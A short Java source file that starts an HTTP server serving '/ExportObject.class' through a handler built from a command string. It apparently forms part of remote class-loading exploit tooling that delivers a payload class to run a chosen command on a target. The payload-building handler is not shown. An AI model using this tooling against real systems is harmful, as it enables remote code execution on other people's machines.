package gds.els;

import java.io.IOException;
import java.net.InetAddress;
import java.net.InetSocketAddress;

import com.sun.net.httpserver.HttpServer;

@SuppressWarnings("restriction")
public class MyHttpServer {

	public static void run(InetAddress host, int port, String command) {

		try {
			HttpServer httpServer = HttpServer.create(new InetSocketAddress(host, port), 0);
			httpServer.createContext("/ExportObject.class", new HttpFileHandler(command));
			httpServer.setExecutor(null);
			httpServer.start();
			System.out.println("[+] HTTP server listening on " + host.getHostAddress() + ":" + port);
		} catch (IOException e) {
			System.out.println("[-] Exception: " + e.getMessage());
			e.printStackTrace();
			System.out.println(5);
		}

	}

}
